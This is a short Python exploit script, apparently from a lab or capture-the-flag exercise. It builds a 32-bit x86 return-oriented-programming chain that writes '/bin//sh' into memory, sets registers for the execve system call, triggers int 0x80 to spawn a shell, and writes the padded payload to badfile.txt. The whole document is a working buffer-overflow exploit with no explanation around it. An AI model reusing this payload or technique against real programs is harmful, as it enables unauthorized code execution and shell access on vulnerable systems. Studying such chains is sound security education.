from struct import pack
p=b'y\nn\n'
p += b'A'*26

p += pack('<I', 0x08058f2c) # pop edx ; ret
p += pack('<I', 0x080e3020) # @ .data
p += pack('<I', 0x08057668) # pop eax ; pop edx ; pop ebx ; ret
p += b'/bin'
p += pack('<I', 0x080e3020) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080581c2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08058f2c) # pop edx ; ret
p += pack('<I', 0x080e3024) # @ .data + 4
p += pack('<I', 0x08057668) # pop eax ; pop edx ; pop ebx ; ret
p += b'//sh'
p += pack('<I', 0x080e3024) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080581c2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08058f2c) # pop edx ; ret
p += pack('<I', 0x080e3028) # @ .data + 8
p += pack('<I', 0x08057754) # xor eax, eax ; ret
p += pack('<I', 0x080581c2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0804815a) # pop ebx ; ret
p += pack('<I', 0x080e3020) # @ .data
p += pack('<I', 0x0809e95b) # pop ecx ; ret
p += pack('<I', 0x080e3028) # @ .data + 8
p += pack('<I', 0x08058f2c) # pop edx ; ret
p += pack('<I', 0x080e3028) # @ .data + 8
p += pack('<I', 0x08057754) # xor eax, eax ; ret
p += pack('<I', 0x080601f3) # inc eax ; ret
p += pack('<I', 0x080601f3) # inc eax ; ret
p += pack('<I', 0x080601f3) # inc eax ; ret
p += pack('<I', 0x080601f3) # inc eax ; ret
p += pack('<I', 0x080601f3) # inc eax ; ret
p += pack('<I', 0x080601f3) # inc eax ; ret
p += pack('<I', 0x080601f3) # inc eax ; ret
p += pack('<I', 0x080601f3) # inc eax ; ret
p += pack('<I', 0x080601f3) # inc eax ; ret
p += pack('<I', 0x080601f3) # inc eax ; ret
p += pack('<I', 0x080601f3) # inc eax ; ret
p += pack('<I', 0x08049c49) # int 0x80


print(b'/bin')
with open("badfile.txt", "wb") as f:
    f.write(p)